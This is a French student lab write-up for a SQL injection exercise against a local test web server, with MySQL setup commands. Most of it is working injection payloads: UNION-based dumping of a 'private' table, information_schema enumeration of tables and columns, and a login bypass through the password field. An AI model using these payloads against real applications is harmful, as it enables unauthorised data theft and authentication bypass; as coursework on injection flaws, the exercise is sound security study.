Etudiants :

Pierre Michiels - Master 1 Cloud Computing
Clément Saulquin - IoT


Gérer la DB MySQL dans le terminal:
'mysql -p -u etudiant'
mdp > etudiant

pour l'exercice:
'mysql -p -u root -p sdsdb < contenu-base.sql'

(OU pour changer le mdp root pour mysql: https://phoenixnap.com/kb/how-to-reset-mysql-root-password-windows-linux)
commandes voir http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm

Lister les DB:
'show databases;'
Créer une DB:
'create database sdsdb;'
Selection DB:
'use sdsdb;'

Aller sur le lien: '127.0.0.1:8080/view'




Partie 1

On entre dans l'input sur le site la chaine suivante => ' OR '1'='1 union select * from private
et on obtient toutes les valeurs de la colonne présente dans le select (SELECT text FROM articles WHERE id=').




Pour avoir la liste des tables en db 'sdsdb' (seul 1 résultat à la fois selon ce que serveur.py permet d'afficher):
Pour le 1er tuple:
SELECT table_name FROM information_schema.tables WHERE table_schema = 'sdsdb' limit 0,1;
Sur le site, dans l'input, il faudra donc mettre:
    ' and 1=0 union SELECT table_name FROM information_schema.tables where table_schema='sdsdb' limit 0,1;--
Pour le 2eme tuple:
SELECT table_name FROM information_schema.tables WHERE table_schema = 'sdsdb' limit 1,1;
Sur le site, dans l'input, il faudra donc mettre:
    ' and 1=0 union SELECT table_name FROM information_schema.tables where table_schema='sdsdb' limit 1,1;--
Pour le 3eme tuple:
SELECT table_name FROM information_schema.tables WHERE table_schema = 'sdsdb' limit 2,1;
Sur le site, dans l'input, il faudra donc mettre:
    ' and 1=0 union SELECT table_name FROM information_schema.tables where table_schema='sdsdb' limit 2,1;--

Ce qui nous intéresse est la table 'private'
(=> ' and 1=0 union SELECT table_name FROM information_schema.tables where table_schema='sdsdb' limit 1,1;--)


Ensuite, on apprend ses colonnes:
SELECT column_name FROM information_schema.columns where table_schema = 'sdsdb' and table_name = 'private' limit 0,1;
etc. pour les autres collonnes limit 1,1, limit 2,1 etc...

On découvre que c'est le champ secretstuff qui nous intéresse
(=> ' and 1=0 union SELECT column_name FROM information_schema.columns where table_schema = 'sdsdb' and table_name='private' limit 1,1;--)

On va afficher les tuples 1 par un du champ secrestuff de la table private:
SELECT text FROM articles WHERE id='' and 1=0 union select secretstuff from private limit 0,1;--'
Sur le site, dans l'input, il faudra donc mettre:
    ' and 1=0 union select secretstuff from private limit 0,1;--


Partie 2
(utile: select * from users;)

contourner l'auth.:
la requête qui passe:
SELECT * FROM users WHERE login='azerty' and password='' and 1=0 union SELECT table_name, 1, 1 FROM information_schema.tables where table_schema='sdsdb' limit 2,1;--'
(il faut ajouter des valeur bidon pour remplir les champs manquants danbs le select (ex: '1'))
Sur le site, dans l'input, il faudra donc mettre:
input 'login':
    'azerty' (toute autre valeur est aussi bon)
input 'password':
    ' and 1=0 union SELECT table_name, 1, 1 FROM information_schema.tables where table_schema='sdsdb' limit 2,1;--

Ici, il suffit juste que la condition 'cursor.rowcount == 1' dans server.py soit bonne pour pouvoir etre authentifié donc une requete n'importe laquelle qui renvoit
un résultat avec 1 tuple c'est bon.




(https://www.kite.com/python/answers/how-to-send-a-post-request-using-urllib-in-python#)
Récupérer le mdp de l'user 'admin':
(voir script.py)
